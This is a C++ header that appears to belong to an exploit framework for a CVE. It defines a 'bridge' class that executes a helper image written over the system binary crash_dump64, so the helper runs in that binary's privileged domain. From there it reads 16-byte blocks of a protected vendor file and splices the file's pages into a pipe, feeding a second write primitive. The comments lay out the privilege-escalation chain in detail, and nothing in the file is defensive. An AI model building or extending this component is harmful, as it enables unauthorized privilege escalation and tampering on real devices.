#pragma once
/** @file backend/cve_2026_43284/landing/crash_dump_bridge.hpp
 *  The two bridges a carrier this process cannot open needs.
 *
 *  Why they exist: patch #2's target is a vendor file, and an unprivileged process cannot open it --
 *  which leaves both halves of the write stuck, because the block the vector is derived from has to
 *  be read from that file and the ciphertext slot has to be spliced from its page. Patch #1 solves
 *  both at once: the helper image is written over the first blocks of crash_dump64, and executing
 *  that file then runs the helper in the crash_dump domain, where the vendor file is readable. The
 *  helper takes {offset, path} and writes sixteen bytes of the file at that offset to its standard
 *  output -- and its standard output has to be a pipe, because it splices the page rather than
 *  copying it. Both are measured on the device; the retired chain's call is kept verbatim.
 *
 *  So this class is one primitive with two uses: run the patched helper with its output on a pipe of
 *  ours and read the block back (the preimage), or run it with its output on the datagram pipe and
 *  let it splice the page there itself (the ciphertext). Both are the same exec with a different
 *  standard output, which is why they are one class and not two.
 *
 *  Hidden rather than implied: the helper path is the file patch #1 patched; a caller that never ran
 *  patch #1 gets an exec of a stock crash_dump64, whose output is not a page, so this class refuses
 *  until it is told the patch went in. Nothing here decides that; the caller does, and the outcome
 *  says which call failed.
 *
 *  Lifetime: the two paths are copied in and nothing is opened, so a bridge can be constructed before
 *  the route is up and used only while it is. In the spawn form every call forks a helper that exits on
 *  its own; in the session form the first call forks one that stays, and the bridge closes and reaps it
 *  when it dies (or earlier, through close_session()).
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/landing/bridge_session.hpp"
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"

namespace ghostlock::backend::cve_2026_43284::landing {
    /** The bridge, in one of two forms: the spawn form this class has always had (one exec per block,
     *  measured at ~38 ms per exec on the device) and the session form (one exec, then one IPC per
     *  block, bridge_session.hpp). Both serve the same two sources, so the window above this sees no
     *  difference. Which form runs is stated at bind() and defaults to spawn: the device that would
     *  measure the session is locked, so the default does not move until it is. */
    class CrashDumpBridge final {
      public:
        /** How the last call ended. */
        enum class Outcome : unsigned char {
            Never = 0,
            Ok = 1,
            /** bind() was never called, or refused a path. */
            NotBound = 2,
            PipeFailed = 3,
            SpawnFailed = 4,
            /** The helper returned fewer bytes than a block. */
            ShortRead = 5,
            /** The helper exited non-zero, so what it wrote is not a whole block. */
            HelperFailed = 6,
        };

        CrashDumpBridge() noexcept = default;
        CrashDumpBridge(const CrashDumpBridge &) = delete;
        CrashDumpBridge &operator=(const CrashDumpBridge &) = delete;

        /**
         *  Bind the patched helper and the carrier it reads.
         *
         *  @param helper_path  The file patch #1 wrote the helper image into.
         *  @param helper_bytes Its length, terminator excluded. A path of zero bytes, one that does
         *                      not fit kBridgePathBytes, or a path with a control character is
         *                      refused: these strings become argv, and a truncated argv is a
         *                      different command.
         *  @param carrier_path The vendor file the helper reads.
         *  @param carrier_bytes Its length, under the same rule.
         *  @param bridge_mode  kBridgeModeSpawn (the default, and today's behaviour: one exec per
         *                      block) or kBridgeModeSession (one exec, asked over a channel). The
         *                      session is handed the same two paths and starts on first use, so a
         *                      bridge that is bound and never asked never forks.
         *  @return True when both paths were accepted. Nothing is executed here.
         */
        [[nodiscard]] bool bind(const char *helper_path, std::size_t helper_bytes,
                                const char *carrier_path, std::size_t carrier_bytes,
                                int bridge_mode = kBridgeModeDefault) noexcept;

        [[nodiscard]] bool bound() const noexcept { return bound_; }
        /** Which form this bridge was bound in: spawn (0) or session (1). */
        [[nodiscard]] int bridge_mode() const noexcept { return mode_; }
        /** Whether the session child is up; false in spawn mode, where there is no session. */
        [[nodiscard]] bool session_open() const noexcept { return session_.is_open(); }
        /** The session child's pid, or -1 when there is none. */
        [[nodiscard]] pid_t session_pid() const noexcept { return session_.pid(); }
        /** How many requests the session has carried, the handshake included. */
        [[nodiscard]] std::size_t session_requests() const noexcept { return session_.requests(); }
        /** Ends the session early (after the hook is restored, for instance). Idempotent, and a
         *  session closed here stays closed: later blocks fail rather than start a second child. */
        void close_session() noexcept;

        /** The preimage source: sixteen bytes of the carrier, read through the helper. */
        [[nodiscard]] OldPageSource old_page() noexcept {
            return OldPageSource{this, &CrashDumpBridge::read16};
        }
        /** The ciphertext source: the helper splices the carrier's page into the datagram pipe. */
        [[nodiscard]] HelperWriteSource helper() noexcept {
            return HelperWriteSource{this, &CrashDumpBridge::splice16};
        }

        [[nodiscard]] Outcome last_outcome() const noexcept { return outcome_; }
        /** The wait status of the last helper, for the report. */
        [[nodiscard]] int last_status() const noexcept { return last_status_; }

      private:
        /** One block, read back through the helper. */
        static long read16(void *ctx, std::uint64_t offset,
                           std::uint8_t out[kBlockBytes]) noexcept;
        /** One block, spliced by the helper into the caller's pipe. */
        static long splice16(void *ctx, int pipe_write_fd, std::uint64_t offset) noexcept;

        /** The one exec both uses share. @p sink_stdout is where the block must come out. */
        [[nodiscard]] long run(std::uint64_t offset, int sink_stdout, std::uint8_t *out) noexcept;

        /** Starts the session on first use. @return whether the session child is up. */
        [[nodiscard]] bool session_ready() noexcept;
        /** One block through the session. @return kBlockBytes, or -1 (the session latches dead). */
        [[nodiscard]] long session_read16(std::uint64_t offset, std::uint8_t *out) noexcept;
        /** One page spliced by the session into the caller's pipe. */
        [[nodiscard]] long session_splice16(int pipe_write_fd, std::uint64_t offset) noexcept;

        char helper_[kBridgePathBytes] = {};
        char carrier_[kBridgePathBytes] = {};
        bool bound_ = false;
        /** Spawn (0) or session (1); see bind(). */
        int mode_ = kBridgeModeDefault;
        /** The session form's child; inert (no fork, no fd) while the mode is spawn. */
        BridgeSession session_;
        bool session_attempted_ = false;
        bool session_started_ = false;
        Outcome outcome_ = Outcome::Never;
        int last_status_ = 0;
    };
}  // namespace ghostlock::backend::cve_2026_43284::landing
